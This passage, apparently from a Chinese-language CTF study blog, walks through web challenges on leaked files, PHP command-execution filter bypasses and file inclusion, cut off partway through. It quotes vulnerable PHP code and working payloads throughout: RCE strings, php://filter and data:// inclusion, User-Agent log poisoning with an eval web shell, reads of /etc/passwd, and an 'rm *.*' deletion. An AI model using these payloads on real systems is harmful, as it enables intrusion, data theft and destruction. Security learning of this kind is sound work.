<code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code><br>解码: 你赢了，去幺幺零点皮爱吃皮看看<br>屮 皮爱吃皮是’php’的意思 … (想想也是 通关后肯定弹出一个php界面~)<br>行吧 访问 110.php即可</p><h2 id="web19-前端密钥泄露"><a href="#web19-前端密钥泄露" class="headerlink" title="web19 前端密钥泄露"></a>web19 前端密钥泄露</h2><p>一个登录界面 前端源码一看 everthing is here…<br>给了CBC加密的IV KEY 和最后的passwd加密值 直接decrypt即可(写的时候又把参数位置写反了… key MODE iv)<br>passwd : i_want_a_36d_girl</p><h2 id="web20-数据库恶意下载"><a href="#web20-数据库恶意下载" class="headerlink" title="web20 数据库恶意下载"></a>web20 数据库恶意下载</h2><p>题目提示 : mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了<br>早期的asp+access是.mdb形式 访问 &#x2F;db&#x2F;db.mdb(这db咋想到的啊 orz)<br>下载得到数据库 🔍即可找到flag</p><hr><hr><p>总结: 这些细枝末节的考点有时候真的会成为关键！ 当源码找不到思路 尝试许久无果时 试试找泄露！</p><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>这部分没环境爆个鬼🤣</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>只过滤了 flag 所以可以用?,* 来匹配<br>视频有个很秀的做法 <code>system(&quot;cp flag.php 1.txt&quot;)</code> 然后直接访问 &#x2F;1.txt !</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了 flag system php<br>用上面的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cp fla?.??? 1.txt`</span><br></pre></td></tr></table></figure><p>然后访问 &#x2F;1.txt</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号<br>视频这样执行:  <code>/?c=eval($_GET[1]);&amp;1=phpinfo();</code> 注意phpinfo()结尾分号!<br>这里是参数逃逸(跳板) 学到了 orz<br>这样的话 &amp;1&#x3D;后面就可以传任意值了(脱离了参数c的约束 所以不会被匹配到)<br>这样 <code>cat flag.php</code>需要在源代码中查看<br>而视频又给了一种做法 <code>tac flag.php</code> cat反过来写 就可以直接看到了</p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 反引号 分号 括号<br>首先还是可以用上一题的方法 <code>/?c=eval($_GET[1]);&amp;1=phpinfo();</code><br>空格被过滤了可以用url编码(空格 换行 都可以)<br>还有一个点 这里分号被过滤了 可以用 ?&gt;形式  (php最后一条语句不需要分号)<br>视频采用了include<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code><br>&#x2F;etc&#x2F;passwd 也是一个常见的点 可以得到一些基本信息<br>甚至还可以包括 &#x2F;bin&#x2F;ls 二进制文件 orz<br>接下来的获取flag 视频采用的是文件包含的形式 (因为我们这里用的include 无法直接输出)<br><code>/...?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号<br>继续学习新姿势 用require<br><code>/?c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code><br>所以&amp;1&#x3D;后面接伪协议即可读取flag</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号 冒号<br>多过滤了一个冒号 我寻思上题思路也能继续用吧<br>payload : <code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>这里视频总结了一下不需要使用括号的情况(语言结构) 常用:</p><ul><li>echo</li><li>print</li><li>isset</li><li>unset</li><li>include</li><li>require</li></ul><p>这也是为什么过滤了括号我们的include仍然可以用(前面用%0a隔开)<br>虽说print也能执行 但是打印出来的不是数据而是flag.php名称…</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号 冒号 &lt; &#x3D;<br>多过滤了 &lt; &#x3D;<br>az 由于我们用跳板把c的影响去掉了 所以只要在 &amp;1&#x3D; 前面不出现这些就行了 后面还是随意填<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号 冒号 &lt; &#x3D; &#x2F; [0-9]<br>多过滤了 &#x2F; 和 0~9数字<br>只需要把GET[1]改为GET[a]即可<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br>这里视频也说明了为什么我们GET里面的1,a都可以不加引号: php为了向下兼容保留了这种写法(🙇‍)</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>另一种形式:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>尝试传入 <code>/?c=$_GET[1]?&gt;&amp;1=flag.php</code>发现不能得到flag<br>这是因为这样做只能include flag.php这个字符串 而不能解析flag.php中的数据内容<br>这里视频给了一种用data伪协议的做法<br>data伪协议用法:<br><code>data://text/plain,xxx</code><br>会把xxx字符串作为命令执行<br>比如 <code>data://text/plain,&lt;?php phpinfo(); ?&gt;</code><br>那么我们就可以利用shell中的?匹配来绕过flag的过滤<br>姿势很多 视频又用了cp 😄<br><code>/?c=data://text/plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;); ?&gt;</code> 这样以后访问 &#x2F;1.txt即可<br>但有个疑问 为什么我第一次mv 操作后后面不管用mv 还是cp都无法继续操作了?<br>再次复现发现确实mv了过后原来的flag.php就没了 再cp就无效了<br>然后发现 <code>rm *.*</code> 能删掉所有😄</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>过滤了 flag php file<br>这里过滤了php就不能像上面那样 <?php xxx ?>了<br>看视频说把<?php >改为 <?= >就行了(短标签)一试还真行 orz这样就可以用system来执行了`/?c=data://text/plain,<?= system("tac fla?.???"); ?><code>当然也可以这种方式:</code>&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("cp fl*.* 22.txt"); ?>&#96;(这么一看*通配符比?好用点 orz)</p><hr><hr><p>所以再看看37,38发现并没有用到第二行的 <code>echo $flag</code> 都是直接利用include+data伪协议直接命令执行了</p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>又是一种新形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的第一思路还是采取data伪协议来命令执行 最后加的.php后缀利用%20截断即可<br><code>/?c=data://text/plain,&lt;?= system(&quot;tac *.*&quot;) ?&gt;%20</code><br>然后看视频好像不截断也不会影响前面的代码执行 只是会加上一行回显 xxx.php罢了(xxx是前面命令执行的返回值)</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>过滤了好多 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里剩下了字母 分号 下划线等(其实题目过滤的是中文括号！！！)<br>emmm 完全不会~ 学习一下<br>看hint:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))); GXYCTF的禁止套娃 通过cookie获得参数进行命令执行</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure><h3 id="solution1"><a href="#solution1" class="headerlink" title="solution1"></a>solution1</h3><p>payload: <code>/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code> 可以得到flag<br>或者 <code>/?c=show_source(next(array_reverse(scandir(getcwd()))));</code><br>当然这里也可以把 <code>show_source</code> 改为 <code>echo highlight_file</code> (这时回显是flag后跟了一个1)<br>orz tql 先放这</p><ul><li>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</li><li>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</li><li>pos():输出数组第一个元素，不改变指针；</li><li>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</li><li>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</li><li>array_reverse():数组逆置</li><li>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</li><li>show_source():查看源码</li><li>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。提示：该函数不会移动数组内部指针。</li></ul><h3 id="solution2"><a href="#solution2" class="headerlink" title="solution2"></a><del>solution2</del></h3><p>题目提示还给了一种方法<br>先传payload:  <code>/?c=session_start();system(session_id());</code><br>然后找到PHPSESSID 将值修改为 ls(bp抓包修改也行) 就可以执行 system(“ls”)! orz 太秀了吧…<br>但是呢 这样拿不到flag.php的值 这样改了传过后PHPSESSID也变了(但这种也是一个很有趣的思路)</p><h3 id="solution3"><a href="#solution3" class="headerlink" title="solution3"></a>solution3</h3><p>视频给了另外的方法<br>也学习到了很多新东西</p><ul><li>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</li><li>next()将内部指针指向数组中的下一个元素，并输出。</li><li>array_pop() 函数删除数组中的最后一个元素并返回其值。</li></ul><p>传入 <code>/?c=print_r(get_defined_vars());</code> 来打印所有变量<br>这里我们再POST一个a&#x3D;phpinfo();<br>通过  <code>next(get_defined_vars())</code> 可以得到 <code>Array ( [a] =&gt; phpinfo(); ) </code><br>拿到这个数组后 利用array_pop可以弹出数组中的内容 也就是我们需要的phpinfo();<br><code>array_pop(next(get_defined_vars()))</code><br>所以构造payload <code>/?c=eval(array_pop(next(get_defined_vars())));</code> 即可执行<br>接下来只需要把 POST的值改一改就能RCE了<br>注意POST传的值结尾要有分号！</p><h3 id="solution4"><a href="#solution4" class="headerlink" title="solution4"></a>solution4</h3><p><code>?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;);</code><br>跟读取post参数类似，直接读get参数然后分离出来执行<br>这里实测发现其实是先用reset将传入c之前的所有变量清空 再传入c作为第一个变量 而后传入的1变量是第二个<br>那么用next指向第二个(也就是c1)就能执行了(print_r打印可以发现直接就是<code>system(&quot;tac flag.php&quot;);</code>字符串所以不需要取数组元素操作)</p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里后面跟的是 <code>/i</code> 所以大小写字母都被过滤了<br>这… 貌似是无数字字母RCE 以前没学过 现在正好学一学<br>题目给了个<a href="https://blog.csdn.net/miuzzx/article/details/108569080" target="_blank">hint</a><br>那就跟着学一学吧<br>题目留了个 or 运算符 也就是我们可以通过 <code>%40 | %01</code> 来构造A(提交后会自动url解码)<br>注意到我们构造出来的字符串是不能直接执行的<br>利用php特性:<br>phpinfo();    &lt;&#x3D;&gt;   (‘phpinfo’)();<br>下面看看如何构造system<br>单个字母构造 : <code>(&#39;%40&#39;|&#39;%13&#39;)</code> 那么多个字母如何拼接呢? 利用php的 “.” 运算符可以实现<br>所以 system(“ls”): <code>((&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%19&#39;).(&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%14&#39;).(&#39;%40&#39;|&#39;%05&#39;).(&#39;%60&#39;|&#39;%0d&#39;))(((&#39;%40&#39;|&#39;%0c&#39;).(&#39;%40&#39;|&#39;%13&#39;)))</code><br>但是这样还是不可执行 因为我们构造的里面有 <code>%0d</code> 这个是换行符…<br>执行会出现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>这种情况<br>所以最好还是要用题目给的两个脚本来跑 过几天再来看 (php本地环境没装)</p><hr><hr><p>总之这道题展示了一种技巧 像其他的比如 取反 xor 来构造都大同小异</p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从没见过的东西…  orz<br>看视频的大致意思 就是不管怎么执行$cxxx 所有返回结果都不显示<br>又学到了一个姿势:<br>构造payload:  <code>/?c=ls;ls</code> 这样就能得到回显<br>因为我们相当于传了两条命令 后面的ls被写入黑洞中了 但是分号前面的这条命令会正常执行! orz<br>这样就可以直接RCE了</p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加了一小点过滤 过滤了 \ 分号 | cat<br>过滤了分号就不能直接用上题的方式了<br>学习到了 and: &amp;&amp; (上一题我还试过 只是写成单&amp;了…<del>G</del>)<br>&amp;&amp; 连接代表第一个命令执行成功后才执行第二个<br>但是直接 <code>ls&amp;&amp;ls</code> 还是没回显<br>看视频说要将 &amp; url编码 %26 (为什么呢?)<br>因为我们直接传 <code>/?c=ls&amp;&amp;ls</code> 会被解析成我传了 c&#x3D;ls 和一个 &amp;ls<br>我们想要的命令结构就被破坏掉了 所以url上编码隐藏一层 提交后自动url解码就是我们想要的命令形式了</p><p>尝试 || 不编码即可执行</p><hr><hr><p>web orz</p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>az<br>一样的用 &amp;&amp;来绕就行了<br><code>/?c=tac%20fla*.*||ls</code></p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>多过滤了空格<br>尝试%20发现也被过滤<br>但是我们还可以用 %09(水平制表符)<br><code>/?c=tac%09fla*.*||ls</code></p><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>这里虽然过滤了0-9 但是我们url编码的%09解码后不是数字<br>在我们提交和最后preg_match中间经历了一层url解码<br><code>/?c=ta\c%09fla?.???||ls</code> 即可</p><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是直接 <code>/?c=tac%09fla?.ph?||ls</code> 即可绕过</p><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmm 一样的直接绕 <code>/?c=tac%09fla?.ph?||ls</code><br>看题目的hint学到了另外的思路<br><code>nl&lt;fla&#39;&#39;g.php||</code></p><ul><li>nl: 列出文件内容 并加上行号(空白也加)</li><li>&lt;: 这里&lt;&#x3D;&gt;%09</li><li>‘’: 这里可绕过空格(实测双引号也行)</li></ul><p>这里自己试了试发现 <code>/?c=tac&lt;fla&#39;&#39;g.php||</code> 是可以绕过的  但是  <code>/?c=tac&lt;fla?.php||</code> 就不行了’(但我本地Linux又行…)</p><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p>多过滤了个 %<br>可以用&lt;代替%09<br><code>/?c=tac&lt;fla&#39;&#39;g.php||</code></p><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>多过滤%09 %26<br>还是一样的payload<br><code>/?c=tac&lt;fla&#39;&#39;g.php||</code></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><code>/?file=pHp://FilTer/convert.base64-encode/resource=flag.php</code></p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>多加了个对php的过滤<br>换data协议试试<br>跟着视频学到了一种方法<br><code>/?file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code><br>这里因为过滤了php 所以采用短标签绕过<br>然后POST上传 <code>1=system(&quot;tac flag.php&quot;);</code> 注意分号<br>就可以绕过了</p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>在上题的基础上增加了 <code>str_replace(&quot;data&quot;, &quot;???&quot;, $file);</code><br>data伪协议也不能用了<br>又学到了神奇的绕过姿势 orz<br>视频利用的是日志注入漏洞<br><code>User-Agent: &lt;?php eval($_POST[1]);?&gt;</code><br>然后传 <code>/?file=/var/log/nginx/access.log</code><br>再POST即可<br>这里改为了 fl0g.php<br>tql 待会儿看看日志知识点 orz</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>在上题的基础上增加了 <code>str_replace(&quot;:&quot;, &quot;???&quot;, $file);</code><br>用上题的日志注入一样可以绕过<br><code>/?file=/var/log/nginx/access.log</code><br>UA: <code>&lt;?=eval($_POST[1]);?&gt;</code><br>POST: <code>1=system(&quot;tac fl??.php&quot;);</code></p><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了点号后就不能像上一题那样绕过了<br>这里完全没思路<br>贴两个学习链接<br><a href="https://www.freebuf.com/news/202819.html" target="_blank">here1</a><br><a href="https://xz.aliyun.com/t/10662" target="_blank">here2</a></p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是如何绕过’死亡exit’的问题 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br>可以用php:&#x2F;&#x2F;filter编码来绕过<br>文章写了三种思路:</p><ul><li>base64编码</li><li>strip_tags+base64 双过滤器</li><li>rot13</li></ul><p>这里简单一点直接用rot13转一下 让前面的php代码不执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span 